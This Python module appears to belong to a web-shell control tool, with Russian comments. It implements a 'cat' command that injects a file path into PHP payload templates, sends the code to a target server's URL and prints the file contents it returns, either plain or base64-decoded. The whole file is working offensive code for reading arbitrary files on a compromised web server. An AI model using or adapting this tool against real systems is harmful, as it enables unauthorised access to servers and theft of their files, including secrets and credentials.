import modules.send as send
import modules.exist as exist
from base64 import b64decode
import html


def file(url,com,pwd,uagent):
    with open('modules\\cat\\cat.php') as f:data = f.read()
    if "/" in com: #Проверка на абсолютный путь удяляемого
        if exist.file(url,com,uagent) == "1":
            data = data.replace("$cat = $_LOCAL;", f"$cat = \'{com}\';")
            file = send.send(url,data,uagent)
            print(html.unescape(file))

        else:
            print("Файла не существует")

    else:
        if exist.file(url,pwd+'/'+com,uagent) == "1":
            data = data.replace("$cat = $_LOCAL;", f"$cat = \'{pwd+'/'+com}\';")
            file = send.send(url,data,uagent)
            print(html.unescape(file))

        else:
            print("Файла не существует")

def base(url,com,pwd,uagent):
    with open('modules\\cat\\bcat.php') as f:data = f.read()
    if "/" in com: #Проверка на абсолютный путь удяляемого
        if exist.file(url,com,uagent) == "1":
            data = data.replace("$cat = $_LOCAL;", f"$cat = \'{com}\';")
            file = send.send(url,data,uagent)
            print(str(b64decode(file).decode('utf-8', errors='ignore')))
        else:
            print("Файла не существует")

    else:
        if exist.file(url,pwd+'/'+com,uagent) == "1":
            data = data.replace("$cat = $_LOCAL;", f"$cat = \'{pwd+'/'+com}\';")
            file = send.send(url,data,uagent)
            print(str(b64decode(file).decode('utf-8', errors='ignore')))
        else:
            print("Файла не существует")